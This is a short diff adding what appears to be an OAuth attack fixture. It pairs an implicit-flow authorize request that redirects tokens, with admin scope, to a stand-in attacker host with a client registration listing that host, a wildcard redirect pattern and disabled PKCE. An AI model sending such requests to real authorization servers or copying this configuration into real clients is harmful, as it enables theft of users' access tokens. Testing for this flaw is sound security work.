@@ -1,0 +1,18 @@
+GET /authorize?response_type=token&client_id=acme-spa&redirect_uri=https://attacker.example.com/cb&scope=openid%20profile%20email%20admin:read HTTP/1.1
+Host: auth.acme.com
+
+--- discovery ---
+GET /.well-known/openid-configuration
+{
+  "issuer": "https://auth.acme.com",
+  "authorization_endpoint": "https://auth.acme.com/authorize",
+  "token_endpoint": "https://auth.acme.com/oauth/token",
+  "registered_clients": {
+    "acme-spa": {
+      "client_type": "public",
+      "redirect_uris": ["https://*.acme.com/cb", "https://attacker.example.com/cb"],
+      "grant_types": ["implicit", "authorization_code"],
+      "require_pkce": false
+    }
+  }
+}
